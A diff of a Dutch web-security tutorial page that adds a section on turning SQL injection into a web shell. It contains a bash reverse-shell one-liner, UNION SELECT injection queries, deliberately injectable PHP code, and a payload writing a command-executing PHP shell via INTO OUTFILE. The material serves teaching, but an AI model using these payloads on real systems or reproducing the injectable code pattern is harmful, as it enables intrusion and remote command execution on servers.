@@ -619,8 +619,31 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <pre><code>SELECT table_schema, table_name FROM information_schema.table
 </code></pre><p>Doormidden van group_concat en concat kan je vervolgens deze velden in 1 kolom stoppen.</p>
 <p>Als we terug gaan naar onze union select injectie kunnen wij de volgende query ervan maken:</p>
-<p><code>-1 UNION SELECT 1, SELECT GROUP_CONCAT(concat(&#39;table_schema&#39;.&#39;table_name&#39;), &#39;-&#39;) FROM information_schema.table # --</code> </p>
+<p><code>-1 UNION SELECT 1, GROUP_CONCAT(concat(&#39;table_schema&#39;.&#39;table_name&#39;), &#39;-&#39;) FROM information_schema.table # --</code> </p>
 <p>Zie in de inhoud nu alle tabellen verschijnen.</p>
+<h3 id="van-sql-injectie-naar-webshell">Van SQL injectie naar Webshell</h3>
+<p>Als wij het bovenstaande codevoorbeeld weer pakken:</p>
+<pre><code>&lt;?PHP
+    $pagina = 0;
+    if (isset($_GET[&#39;pagina&#39;]))
+    {
+        $pagina = $_GET[&#39;pagina&#39;];
+    }
+
+    $rPagina = mysqli_query($db, &quot;SELECT titel, inhoud FROM paginas WHERE id=&quot;.$_GET[&#39;pagina&#39;].&quot; LIMIT 1&quot;);
+    if (mysqli_num_rows($rPagina) &gt; 0)
+    {
+        $aPagina = mysqli_fetch_assoc($rPagina);
+
+        echo &quot;
+            &lt;h1&gt;&quot;.$aPagina[&#39;titel&#39;].&quot;&lt;/h1&gt;
+            &quot;.$aPagina[&#39;inhoud&#39;];
+    }
+?&gt;
+</code></pre><p>Zoals wij eerder gezien hebben kan je dan gegevens opvragen, maar sommige SQL accounts hebben ook toegang tot de <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT ... INTO</a> syntax. Je webapplicatie moet wel schrijfrechten hebben op de plaats waar je een bestand wilt wegschrijven. Denk dan aan logische locaties zoals /tmp (heb je wel een LFI nodig) of in een directory van de webserver. Ook mappen waar de website sowieso file uploads opslaat zijn goede locaties.</p>
+<p>Een voorbeeld van een injectie die je dan kan doen is als volgt:</p>
+<p><code>-1 UNION SELECT 1, &#39;&lt;?PHP $return = array(); exec($_GET[&#39;c&#39;],$return); echo implode(&quot;\n&quot;,$return); ?&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39; # --</code></p>
+<p>Als je dan op de webserver de file shell.php opvraagt met als querystring c=ls dan zal je de directory listing zien van de /var/www/html map.  </p>
 <h2 id="client-side-controle-functionaliteiten">Client-side controle functionaliteiten</h2>
 <h3 id="authenticatiefouten">Authenticatiefouten</h3>
 <h3 id="sessie-managment">Sessie managment</h3>
